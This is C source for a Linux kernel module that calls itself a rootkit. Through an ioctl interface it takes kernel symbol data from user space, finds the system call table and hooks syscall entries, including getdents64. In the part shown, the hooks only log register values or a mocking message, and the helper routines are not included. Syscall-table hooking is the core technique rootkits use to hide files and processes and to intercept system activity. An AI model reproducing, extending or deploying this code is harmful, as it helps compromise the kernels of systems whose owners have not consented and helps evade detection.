#define _GNU_SOURCE
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include "rootkitops.h"
#include "helper.h"

static void funny_joke(struct pt_regs * regs){
    printk(KERN_INFO "[peiwithhao rootkit] \n\n");
    printk(KERN_INFO "rdi = %lx", regs->di);
    printk(KERN_INFO "rsi = %lx", regs->si);
    printk(KERN_INFO "rdx = %lx", regs->dx);
    printk(KERN_INFO "rcx = %lx", regs->cx);
    printk(KERN_INFO "r8 = %lx", regs->r8);
    printk(KERN_INFO "r9 = %lx", regs->r9);
}


static void poor_joke(struct pt_regs * regs){
    printk(KERN_INFO "[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;(");
}


ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
    return 0;
}
ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    return 0;
}

struct hook_context getdents_hook_ctx;
struct hook_context read_hook_ctx;
long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    size_t hooked_addr;
    int ret; switch(cmd){
        case USER_KALLSYMS:
            ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
            break;
        case SEARCH_SYSCALL:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            break;
        case SUPER_HOOK:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            hooked_addr = ((size_t *)syscall_table_addr)[217];
            //orig_modifier(hooked_addr, (size_t)&funny_joke);
            orig_modifier(&getdents_hook_ctx, (size_t)hooked_addr, 0, (size_t)poor_joke);
            orig_modifier(&read_hook_ctx, (size_t)((size_t *)syscall_table_addr)[1], (size_t)&funny_joke, 0);
            break;
        default:
            break;
    }
    return 0;
}
/* 打开类容 */
int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
